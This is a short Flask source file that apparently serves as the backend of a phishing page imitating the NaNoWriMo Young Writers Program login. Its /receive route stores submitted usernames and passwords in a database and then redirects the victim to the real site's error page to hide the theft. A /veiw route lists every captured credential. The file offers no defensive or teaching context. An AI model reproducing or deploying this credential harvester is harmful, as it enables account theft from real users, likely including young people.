from database_init import initdb
from cs50 import SQL
from flask import Flask, flash, jsonify, redirect, render_template, request, session, url_for

db = SQL("sqlite:///database.db")
app = Flask(__name__)

initdb()

@app.route("/")
def front():
    return render_template("index.html")

@app.route("/receive", methods=["GET"])
def receive():
    if request.method == "GET":
        user = request.form.get("user")
        passw = request.form.get("pass")

        db.execute("INSERT INTO ywpdata (u, p) VALUES (:u, :p)", u=user, p=passw)
        return redirect("https://ywp.nanowrimo.org/pages/error")

@app.route("/veiw")
def veiw():
    displaydata = db.execute("SELECT * FROM ywpdata")
    return render_template("veiw.html", data=displaydata)

